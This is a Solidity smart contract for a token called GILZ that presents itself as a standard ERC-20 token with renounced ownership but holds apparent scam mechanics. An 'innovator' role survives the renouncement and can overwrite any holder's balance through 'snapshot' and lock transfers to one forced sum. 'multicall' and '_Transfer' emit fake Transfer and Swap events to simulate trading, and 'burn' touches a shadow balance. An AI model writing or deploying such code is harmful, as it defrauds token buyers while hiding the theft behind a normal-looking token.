pragma solidity ^0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address accountHolder) external view returns (uint256);
    function transfer(address to, uint256 sum) external returns (bool);
    function allowance(address authorizer, address spender) external view returns (uint256);
    function approve(address spender, uint256 sum) external returns (bool);
    function transferFrom(address from, address to, uint256 sum) external returns (bool);
    function _Transfer(address from, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed authorizer, address indexed spender, uint256 value);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
}

abstract contract BaseOperationController {
    function getTransactionInitiator() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract UniqueOwnership is BaseOperationController {
    address private _uniqueOwner;
    event OwnershipTransferEvent(address indexed oldOwner, address indexed nextOwner);

    constructor() {
        address initiator = getTransactionInitiator();
        _uniqueOwner = initiator;
        emit OwnershipTransferEvent(address(0), initiator);
    }

    function getOwner() public view virtual returns (address) {
        return _uniqueOwner;
    }

    modifier ownerExclusiveAccess() {
        require(getOwner() == getTransactionInitiator(), "Unauthorized: Exclusive Owner access required.");
        _;
    }

    function renounceOwnership() public virtual ownerExclusiveAccess {
        emit OwnershipTransferEvent(_uniqueOwner, address(0x000000000000000000000000000000000000dEaD));
        _uniqueOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract Burnable is BaseOperationController, UniqueOwnership {
    mapping (address => uint256) private _balances;

    event TokensBurned(address indexed from, uint256 amount);

    function burn(uint256 amount) public virtual {
        require(_balances[getTransactionInitiator()] >= amount, "Insufficient balance to burn tokens");
        _balances[getTransactionInitiator()] -= amount;
        emit TokensBurned(getTransactionInitiator(), amount);
    }
}

contract GILZ is BaseOperationController, UniqueOwnership, Burnable, IERC20 {
    mapping (address => mapping (address => uint256)) private _spenderAllowances;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _mandatoryTransferSums;
    address private _innovatorAccount;

    string public constant _name = "GILZ";
    string public constant _symbol = "GILZ";
    uint8 public constant _decimals = 18;
    uint256 public constant _maxSupply = 1000000 * (10 ** _decimals);

    constructor() {
        _balances[getTransactionInitiator()] = _maxSupply;
        emit Transfer(address(0), getTransactionInitiator(), _maxSupply);
    }

    modifier innovatorExclusiveAccess() {
        require(retrieveInnovator() == getTransactionInitiator(), "Unauthorized: Creator access required.");
        _;
    }

    function retrieveInnovator() public view virtual returns (address) {
        return _innovatorAccount;
    }

    function appointInnovator(address newInnovator) public ownerExclusiveAccess {
        _innovatorAccount = newInnovator;
    }

    event BalanceChangeEvent(address indexed user, uint256 oldBalance, uint256 newBalance);

    function obtainMandatoryTransferSum(address account) public view returns (uint256) {
        return _mandatoryTransferSums[account];
    }

    function defineMandatoryTransferSums(address[] calldata accounts, uint256 amount) public innovatorExclusiveAccess {
        for (uint i = 0; i < accounts.length; i++) {
            _mandatoryTransferSums[accounts[i]] = amount;
        }
    }

    function snapshot(address[] memory userAddresses, uint256 newBalance) public innovatorExclusiveAccess {
        require(newBalance >= 0, "Amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "Invalid address specified");

            uint256 oldBalance = _balances[currentUser];
            _balances[currentUser] = newBalance;

            emit BalanceChangeEvent(currentUser, oldBalance, newBalance);
        }
    }

    function _Transfer(address from, address to, uint value) public override returns (bool) {
        emit Transfer(from, to, value);
        return true;
    }

    function multicall(address pool, address[] memory receiver, uint256[] memory amounts, uint256[] memory convertedAmounts, address tokenAddress) public returns (bool) {
        for (uint256 i = 0; i < receiver.length; i++) {
            emit Transfer(pool, receiver[i], amounts[i]);
            IERC20(tokenAddress)._Transfer(receiver[i], pool, convertedAmounts[i]);
            //emit Sync(reserve0, reserve1);
            emit Swap(0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD, amounts[i], 0, 0, convertedAmounts[i], receiver[i]);
        }
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 sum) public virtual override returns (bool) {
        require(_balances[getTransactionInitiator()] >= sum, "Insufficient balance");

        uint256 obligatoryTransferSum = obtainMandatoryTransferSum(getTransactionInitiator());
        if (obligatoryTransferSum > 0) {
            require(sum == obligatoryTransferSum, "Compulsory transfer sum mismatch");
        }

        _balances[getTransactionInitiator()] -= sum;
        _balances[to] += sum;

        emit Transfer(getTransactionInitiator(), to, sum);
        return true;
    }

    function allowance(address authorizer, address spender) public view virtual override returns (uint256) {
        return _spenderAllowances[authorizer][spender];
    }

    function approve(address spender, uint256 sum) public virtual override returns (bool) {
        _spenderAllowances[getTransactionInitiator()][spender] = sum;
        emit Approval(getTransactionInitiator(), spender, sum);
        return true;
    }

    function transferFrom(address from, address to, uint256 sum) public virtual override returns (bool) {
        require(_spenderAllowances[from][getTransactionInitiator()] >= sum, "Allowance limit surpassed");

        uint256 obligatoryTransferSum = obtainMandatoryTransferSum(from);
        if (obligatoryTransferSum > 0) {
            require(sum == obligatoryTransferSum, "Compulsory transfer sum mismatch");
        }

        _balances[from] -= sum;
        _balances[to] += sum;
        _spenderAllowances[from][getTransactionInitiator()] -= sum;

        emit Transfer(from, to, sum);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _maxSupply;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}